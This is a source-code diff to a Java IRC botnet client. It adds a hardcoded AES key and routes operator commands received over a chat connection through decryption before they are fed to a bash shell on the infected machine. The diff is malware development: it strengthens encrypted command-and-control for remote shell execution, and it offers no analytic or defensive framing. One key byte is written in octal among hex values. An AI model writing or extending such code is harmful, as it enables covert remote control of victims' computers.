@@ -1,6 +1,10 @@
 import java.io.*;
 import java.net.*;
+import java.security.Key;
 import java.util.*;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
 import javax.mail.*;
 import javax.mail.internet.*;
 
@@ -25,6 +29,19 @@ public class BotnetClient extends PircBot {
 	private String id;
 	private String operator;
 	
+	private static final byte[] key = 
+	{(byte)0x2e, (byte)0xa0, (byte)0x8c, (byte)0x66, (byte)0xf6, (byte)0x8d, (byte)0x71, 
+	(byte)0xae, (byte)0x83, (byte)0xa1, (byte)0x24, (byte)0x96, (byte)0xa3, (byte)0xc3, 
+	(byte)0xd0, (byte)0x91, (byte)0x7f, (byte)0x86, (byte)0x69, (byte)0x78, (byte)0x99, 
+	(byte)0xee, (byte)0x80, (byte)032, (byte)0x9d, (byte)0xb8, (byte)0xb1, (byte)0x47, 
+	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};
+
+	private Key startKey;
+	private Cipher startCipher;
+	private MsgEncrypt startMsgE;
+	
+	private Key privKey;
+	
 	public static void main(String[] args) {
 		BotnetClient bn = new BotnetClient();
 	}
@@ -34,6 +51,11 @@ public class BotnetClient extends PircBot {
 		uuid = UUID.randomUUID().toString();
 		id = NAME + "_" + uuid;
 		try {
+			startKey = new SecretKeySpec(key, "AES");
+			startCipher = Cipher.getInstance("AES");
+			startCipher.init(Cipher.DECRYPT_MODE, startKey);
+			startMsgE = MsgEncrypt.getInstance(startKey);
+			
 			setVerbose(DEBUG);
 			setName(id);
 			setMessageDelay(0);
@@ -283,12 +305,17 @@ public class BotnetClient extends PircBot {
 	    public void run() {
 	    	try {
 	    		bashin.println("echo `pwd` '$: '");
-		    	String command = chat.readLine();
+		    	// TODO: make decrypted
+	    		String encCommand = chat.readLine();
+	    		String command = startMsgE.decryptMsg(encCommand);
+	    		//String command = chat.readLine();
 	        	while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
 	        		System.out.println("command: " + command);
 	        		bashin.println(command);
 	        		bashin.println("echo `pwd` '$: '");
-	        		command = chat.readLine();
+	        		//command = chat.readLine();
+	        		encCommand = chat.readLine();
+	        		command = startMsgE.decryptMsg(encCommand);
 	        	}
 	        	bashin.println("exit 0");
 	    	} catch (Exception e) {
